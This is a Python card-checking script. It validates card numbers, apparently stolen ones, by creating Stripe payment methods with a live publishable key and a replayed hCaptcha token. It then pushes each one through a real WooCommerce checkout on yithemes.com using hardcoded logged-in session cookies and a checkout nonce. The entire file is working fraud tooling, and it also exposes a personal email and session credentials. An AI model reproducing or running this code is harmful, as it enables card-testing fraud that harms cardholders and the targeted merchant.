import time
import requests
def Tele(ccx):
    import requests
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
        yy = yy.split("20")[1]
    r = requests.session()
    import requests

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'ar-IQ,ar;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

    data = f'type=card&billing_details[name]=Mpdca+Lost&billing_details[address][country]=US&billing_details[email]=hasam2021k%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=3f3aa1ae-8837-41e4-8850-cd11e525cb041333b8&muid=b240bc3c-3868-4148-b4d2-97f49425a7e3e24b38&sid=d301ddc5-44a9-42de-95ee-915b50d0090218d457&payment_user_agent=stripe.js%2F97cb06c5c7%3B+stripe-js-v3%2F97cb06c5c7%3B+split-card-element&referrer=https%3A%2F%2Fyithemes.com&time_on_page=154834&key=pk_live_U1K2sbbK19ycTekokBhgUuLj&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZOdooZJxQ1b8qqK6USFtzBCYozCLl6pdSTONuO02C896ZEsr6_j6JjVZRmJT5XThcmDoOVng-YYxwWv1Q6SPndODuGqnYB9ocnPOnhMpFtO6MGoBK_gEjRVtVeF2Y-7woouQFVsAs614TWUaI1CF9ebhA1-Q4ceiTz0p1DJpNctj_Zooc00UByULxEOJR1qM4OAbqRds2bop3PsOU3JhVhSYpDSg5icieoGyAmZqb6uCWysGOiAagy-etbj11FQKW4AYfV6uUSZ26c7IlmD_IYuu8Uf1wpuC135ODPupqF_SGa9SCnHuLYGHKNqPb62KdqpLt0RTPw11P-fHbek3S7LKewyloA9DKL_ZdtiXrtHQZufnKEnwOxahc767K-KEs74Gv8Mbr0RjvaWHj76mf0gbp2oq-r5G-X9-br__Jo5UTvJO4FkWOekocjaEl_AvSfm7jdxnZIXEerMhMfHBZKNmoQ0iABbWwoy7Xf3QSBmwXRfGx8H9GqpUV4Xv3E8_vZn7HO_bSKAdilTrpxmzZ23ijpkh-UXqK3FN1okGLZlZVgIujDobs_PJo4KCgvGl8irI_NotFCV-cg_n7V8w7CJrJRpc1tUal9dJPy8ftd9QiZdATj85kzE6bBbsNz8WJEKCcU86Dw8kRmC5RBHY3oQ4JD6PjVm7pyh-GD34VT-QbYLJZ8ii7wZBVFw47ClOCRmDq-oeSTr-Z_404joksldkO35ZuQr3vzfczzpeXO_rkm-wBK1EroJx3fvv4GJXzgEQirJv6mPEixaOkyYzI44Yo7ICJGyw-wyKK0_kTifthocOzaVx4nGYFjvYnZj3nDhNMLCSeXkOUqtTfv-gAxrHZwhwzzMYtQrSJK6tMR7kjuP3noTrYBpBTT11khb96nnR2SgncIkCzJ3t-q8xgxxDMxC2ltuAfHybKxZhtpEgGtDRjmZQ18b7YS5hU3i_aN0pBKGsoYQqnkYlqkofXB3c2RyNyAjNseRq116QfFQ0x1HhjACw0_K4mlnvBuR_q_ShYANzyw56VLZlCfK7DCK4saqlXBgBaaXKWimMY0cNaNDVC1AMZOMHm-YnOBu9GEWP4CiE6jF4_-4V4nl83orkcp_bVoSS2mklsP_b7oSEEExXIrHabZzEA7jGHhQ2Z0QOKy69cwUCbqxTPJggeYVBjtG50zwMzFXwk4i09dP9K-mRU_nohldAlzCArDRQAws5QlHJHo26C1NrxrUQzwMTdq6iW9DVxG0LEgm3jQWNRpzzlLEtiODLN113-H-l3u4luuFYuh0AnwJXjIobvOo9m2KyYPFgAYaDQ4LjeGBxKe_bbRwFsyw_2NoI_0Lfn-2ECIkuFbfj_IBq16oEwbRFq-0rU7thPoGbjnfgwINnT6mXQFmfI0mDfcViaIKz3sXqQnpqPYB05L2Z5rapWLEKqQ0W3Et1lMoess2LKtucfYfxBoIImnlUU-CVdpk_klGn3LeF32QTgs4AishfkJ9cUJyTrqP_BOqb5sm5lkBzC2oLDYlSAG_m20UnvQVQFtc55g-tb9s-zHIzAuRhKqjX8KCWM0HTDQpiHXRBR1Rnlu4dhcmE70OU43BcczGbQgWZ3OnZKsVpJhtt-3UcKbA0C3qJngIT4QsbYC2FeXTkkItX8ApRl9dOAzzfxHEFEgm3Nd3Kn6CLUrTFK_71ipC2vQJcWsMyD8ce06i98I4MisCVDp9B2waYg-Wi6k_EeVAuFBJmtmIvhkr7z_LGhX-isEOCA4U98TWplXTXtDXqsyw0F9QqeivUFWvXgx-8W1cle6wjAFhD9xF6wnelCJs0rkMet1b2vix0_lE1IjLfIc3HzeDlERa3HeERd5BK70DlE1a_5rND0qRtjCqWy0CWYIhDKOC1ZGD49mv89tCVOiZnZhxlIDU2WqzchVGVsvNBI7goumkzcqX_YjjANVOQrzPrX9E6RUIuD4gUtQHWtOWr7S4ziR85TQmHbL4wkhdNPPsJX8m2qqb-2UaChszWjqpsUrTP3-Ud4UKoP0QO2RH9mn5gwcJva7iXSyVsv5dK0kQSIreCTNsIOR6DJllHSb6A-MN1vaeZupYpGYIPOlRehbkTHPo1g77Io4hRUIqmDKSLxWe1Z47Dn7HVRhKSIMkmxd_yHbiwLP93m2o2V4cM5mgRH7qHNoYXJkX2lkzgMxg2-ia3KoNGI2MzQ4ZDaicGQA.YVBpjV1jRmfSJAlX6FoRTjEOsIxUo3s96hm494yrpW8'


    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
        id=response.json()['id']
    except:
        return '#'
    import requests

    cookies = {
        '__zlcmid': '1MWmpghqUZF3PXu',
        '_vwo_uuid_v2': 'DE064AAC72DF01AC4DB4C024C9AD90EE0|1669b09429574b2a7d06164234a1767a',
        '_vis_opt_s': '1%7C',
        '_vis_opt_test_cookie': '1',
        '_vwo_uuid': 'DE064AAC72DF01AC4DB4C024C9AD90EE0',
        '_vwo_ds': '3%241719734393%3A66.40916129%3A%3A',
        '_vis_opt_exp_91_split': '2',
        '_vwo_sn': '0%3A1',
        '_vis_opt_exp_91_combi': '2',
        '_vis_opt_exp_91_goal_1': '1',
        'woocommerce_items_in_cart': '1',
        'wordpress_sec_612923ed9597a65387810b2c092c64ea': 'hasam2021k%7C1720944102%7CYxrUkBPwkfo4HBuZzpNPqdfbAU2VJIXCi2fDNbKNmXy%7Cee86873e28c78ea2f634e04863563a9335e40d353831401eadfd386059de3106',
        'wordpress_logged_in_612923ed9597a65387810b2c092c64ea': 'hasam2021k%7C1720944102%7CYxrUkBPwkfo4HBuZzpNPqdfbAU2VJIXCi2fDNbKNmXy%7C5ace5425eb8fcf6d68a336584d048cd8c84f1026e97fb57796c5cf7f764e9812',
        'wp_woocommerce_session_612923ed9597a65387810b2c092c64ea': '1180748%7C%7C1719907213%7C%7C1719903613%7C%7C8409497e037ea257fa5d36e01c9c6413',
        '_iub_cs-534690': '%7B%22timestamp%22%3A%222024-06-30T07%3A59%3A23.885Z%22%2C%22version%22%3A%221.62.0%22%2C%22purposes%22%3A%7B%221%22%3Atrue%2C%222%22%3Afalse%2C%223%22%3Afalse%2C%224%22%3Afalse%2C%225%22%3Afalse%7D%2C%22id%22%3A534690%7D',
        '__stripe_mid': 'b240bc3c-3868-4148-b4d2-97f49425a7e3e24b38',
        '__stripe_sid': 'd301ddc5-44a9-42de-95ee-915b50d0090218d457',
        'woocommerce_cart_hash': '174b60e8d5e55768bc1560eb0ce0a22d',
    }

    headers = {
        'authority': 'yithemes.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ar-IQ,ar;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '__zlcmid=1MWmpghqUZF3PXu; _vwo_uuid_v2=DE064AAC72DF01AC4DB4C024C9AD90EE0|1669b09429574b2a7d06164234a1767a; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vwo_uuid=DE064AAC72DF01AC4DB4C024C9AD90EE0; _vwo_ds=3%241719734393%3A66.40916129%3A%3A; _vis_opt_exp_91_split=2; _vwo_sn=0%3A1; _vis_opt_exp_91_combi=2; _vis_opt_exp_91_goal_1=1; woocommerce_items_in_cart=1; wordpress_sec_612923ed9597a65387810b2c092c64ea=hasam2021k%7C1720944102%7CYxrUkBPwkfo4HBuZzpNPqdfbAU2VJIXCi2fDNbKNmXy%7Cee86873e28c78ea2f634e04863563a9335e40d353831401eadfd386059de3106; wordpress_logged_in_612923ed9597a65387810b2c092c64ea=hasam2021k%7C1720944102%7CYxrUkBPwkfo4HBuZzpNPqdfbAU2VJIXCi2fDNbKNmXy%7C5ace5425eb8fcf6d68a336584d048cd8c84f1026e97fb57796c5cf7f764e9812; wp_woocommerce_session_612923ed9597a65387810b2c092c64ea=1180748%7C%7C1719907213%7C%7C1719903613%7C%7C8409497e037ea257fa5d36e01c9c6413; _iub_cs-534690=%7B%22timestamp%22%3A%222024-06-30T07%3A59%3A23.885Z%22%2C%22version%22%3A%221.62.0%22%2C%22purposes%22%3A%7B%221%22%3Atrue%2C%222%22%3Afalse%2C%223%22%3Afalse%2C%224%22%3Afalse%2C%225%22%3Afalse%7D%2C%22id%22%3A534690%7D; __stripe_mid=b240bc3c-3868-4148-b4d2-97f49425a7e3e24b38; __stripe_sid=d301ddc5-44a9-42de-95ee-915b50d0090218d457; woocommerce_cart_hash=174b60e8d5e55768bc1560eb0ce0a22d',
        'origin': 'https://yithemes.com',
        'referer': 'https://yithemes.com/checkout/?login_token=1719734502',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
}

    params = {
    'wc-ajax': 'checkout',
}

    data = {
        'billing_country': 'US',
        'billing_state': '',
        'billing_postcode': '',
        'billing_customer_type': 'personal',
        'billing_first_name': 'Mpdca',
        'billing_last_name': 'Lost',
        'billing_email': 'hasam2021k@gmail.com',
        'billing_company': '',
        'billing_vat': '',
        'payment_method': 'yith-stripe',
        'stripe_intent': '',
        'stripe_payment_method': id,
        'terms': 'on',
        'terms-field': '1',
        'woocommerce-process-checkout-nonce': 'a346425130',
        '_wp_http_referer': '/?wc-ajax=update_order_review',
    }

    response = requests.post('https://yithemes.com/', params=params, cookies=cookies, headers=headers, data=data)
    ii = (response.json()['messages'])
    time.sleep(15)
    try:
        ii=response
    except:
        return 'success' 
    return ii
